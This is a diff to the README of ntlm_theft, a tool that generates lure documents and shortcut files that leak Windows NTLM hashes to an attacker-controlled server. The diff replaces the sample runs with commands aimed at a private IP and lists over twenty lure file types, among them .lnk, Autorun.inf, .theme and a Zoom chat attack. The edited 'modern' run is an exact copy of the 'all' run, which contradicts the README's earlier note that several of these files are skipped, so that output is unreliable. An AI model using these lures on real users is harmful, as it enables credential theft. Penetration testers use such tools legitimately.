@@ -32,6 +32,7 @@ ntlm_theft supports the following attack types:
 	* .pdf – via Adobe Acrobat Reader
 * Click Link in Chat Program
 	* .txt – formatted link to paste into Zoom chat
+	
 
 
 ## Usecases (Why you want to run this)
@@ -67,23 +68,32 @@ To start up the tool 4 parameters must be provided, an input format, the input f
 Here is an example of what a run looks like generating all files:
 
 ```
-# python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
-Created: test/test.scf (BROWSE)
-Created: test/test-(url).url (BROWSE)
-Created: test/test-(icon).url (BROWSE)
-Created: test/test.rtf (OPEN)
-Created: test/test-(stylesheet).xml (OPEN)
-Created: test/test-(fulldocx).xml (OPEN)
-Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
-Created: test/test-(includepicture).docx (OPEN)
-Created: test/test-(remotetemplate).docx (OPEN)
-Created: test/test-(frameset).docx (OPEN)
-Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
-Created: test/test.asx (OPEN)
-Created: test/test.jnlp (OPEN)
-Created: test/test.application (DOWNLOAD AND OPEN)
-Created: test/test.pdf (OPEN AND ALLOW)
-Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
+# python ntlm_theft.py -g all -s 10.11.104.208 -f alienkeric
+Created: alienkeric/alienkeric.scf (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric-(url).url (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric-(icon).url (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.lnk (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.rtf (OPEN)
+Created: alienkeric/alienkeric-(stylesheet).xml (OPEN)
+Created: alienkeric/alienkeric-(fulldocx).xml (OPEN)
+Created: alienkeric/alienkeric.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: alienkeric/alienkeric-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: alienkeric/alienkeric-(includepicture).docx (OPEN)
+Created: alienkeric/alienkeric-(remotetemplate).docx (OPEN)
+Created: alienkeric/alienkeric-(frameset).docx (OPEN)
+Created: alienkeric/alienkeric-(externalcell).xlsx (OPEN)
+Created: alienkeric/alienkeric.wax (OPEN)
+Created: alienkeric/alienkeric.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: alienkeric/alienkeric.asx (OPEN)
+Created: alienkeric/alienkeric.jnlp (OPEN)
+Created: alienkeric/alienkeric.application (DOWNLOAD AND OPEN)
+Created: alienkeric/alienkeric.pdf (OPEN AND ALLOW)
+Created: alienkeric/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: alienkeric/alienkeric.library-ms (BROWSE TO FOLDER)
+Created: alienkeric/Autorun.inf (BROWSE TO FOLDER)
+Created: alienkeric/desktop.ini (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.theme (THEME TO INSTALL)
+Created: alienkeric/alienkeric.bat (BROWSE TO FOLDER)
 Generation Complete.
 ```
 
@@ -93,26 +103,32 @@ Generation Complete.
 Here is an example of what a run looks like generating only modern files:
 
 ```
-# python3 ntlm_theft.py -g modern -s 127.0.0.1 -f meeting
-Skipping SCF as it does not work on modern Windows
-Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
-Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
-Created: meeting/meeting.rtf (OPEN)
-Created: meeting/meeting-(stylesheet).xml (OPEN)
-Created: meeting/meeting-(fulldocx).xml (OPEN)
-Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
-Created: meeting/meeting-(includepicture).docx (OPEN)
-Created: meeting/meeting-(remotetemplate).docx (OPEN)
-Created: meeting/meeting-(frameset).docx (OPEN)
-Created: meeting/meeting-(externalcell).xlsx (OPEN)
-Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
-Created: meeting/meeting.asx (OPEN)
-Created: meeting/meeting.jnlp (OPEN)
-Created: meeting/meeting.application (DOWNLOAD AND OPEN)
-Created: meeting/meeting.pdf (OPEN AND ALLOW)
-Skipping zoom as it does not work on the latest versions
-Skipping Autorun.inf as it does not work on modern Windows
-Skipping desktop.ini as it does not work on modern Windows
+# python ntlm_theft.py -g modern -s 10.11.104.208 -f alienkeric
+Created: alienkeric/alienkeric.scf (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric-(url).url (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric-(icon).url (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.lnk (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.rtf (OPEN)
+Created: alienkeric/alienkeric-(stylesheet).xml (OPEN)
+Created: alienkeric/alienkeric-(fulldocx).xml (OPEN)
+Created: alienkeric/alienkeric.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: alienkeric/alienkeric-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: alienkeric/alienkeric-(includepicture).docx (OPEN)
+Created: alienkeric/alienkeric-(remotetemplate).docx (OPEN)
+Created: alienkeric/alienkeric-(frameset).docx (OPEN)
+Created: alienkeric/alienkeric-(externalcell).xlsx (OPEN)
+Created: alienkeric/alienkeric.wax (OPEN)
+Created: alienkeric/alienkeric.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: alienkeric/alienkeric.asx (OPEN)
+Created: alienkeric/alienkeric.jnlp (OPEN)
+Created: alienkeric/alienkeric.application (DOWNLOAD AND OPEN)
+Created: alienkeric/alienkeric.pdf (OPEN AND ALLOW)
+Created: alienkeric/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: alienkeric/alienkeric.library-ms (BROWSE TO FOLDER)
+Created: alienkeric/Autorun.inf (BROWSE TO FOLDER)
+Created: alienkeric/desktop.ini (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.theme (THEME TO INSTALL)
+Created: alienkeric/alienkeric.bat (BROWSE TO FOLDER)
 Generation Complete.
 ```
 
@@ -127,6 +143,7 @@ Generation Complete.
 ## Authors
 
 * **Jacob Wilkin** - *Research and Development*
+
 
 ## License
 
